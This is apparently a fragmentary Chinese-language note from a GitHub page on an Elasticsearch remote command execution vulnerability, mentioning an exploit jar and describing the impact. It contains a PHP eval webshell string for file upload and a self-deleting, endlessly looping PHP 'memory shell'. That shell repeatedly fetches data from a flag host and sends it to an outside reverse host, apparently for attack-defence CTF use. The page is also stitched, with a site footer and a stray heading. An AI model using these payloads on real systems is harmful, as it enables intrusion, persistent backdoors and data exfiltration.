# elasticsearch命令执行漏洞
更新地址：Elasticsearch_1.2.jar 命令参数忘记编码了，导致不能执行多参数已修复了。修改了超时为10秒、异常情况直接输出页面源码。

1
2
1、ElasticSearch是一个基于Lucene构建的开源，分布式，RESTful搜索引擎。设计用于云计算中，能够达到实时搜索，稳定，可靠，快速，安装使用方便。 
2、Lucene是apache软件基金会4 jakarta项目组的一个子项目，是一个开放源代码的全文检索引擎工具包
这个漏洞如果被利用可直接在服务器端执行任意的java代码，ElasticSearch基本都部署在大型集群环境中危害非常的大。

elasticsearch 文件上传的时候必须注意 斜杠 \ 的使用

>"<?php eval(\\\\$_POST[1]);?>hello"

内存马
>file2 = "<?php unlink(\\\\$_SERVER[\'SCRIPT_FILENAME\']);ignore_user_abort(true);set_time_limit(0);while (true) {\\\\$x = file_get_contents(\'" + flag_ip + "\');file_get_contents(\'" + reverse_ip + "/recive.php?a=\'.\\\\$x);sleep(60);}?>"
Contact GitHub API Training Shop Blog About
© 2016 GitHub, Inc. Terms Privacy Security Status Help
# elasticsearch travel漏洞
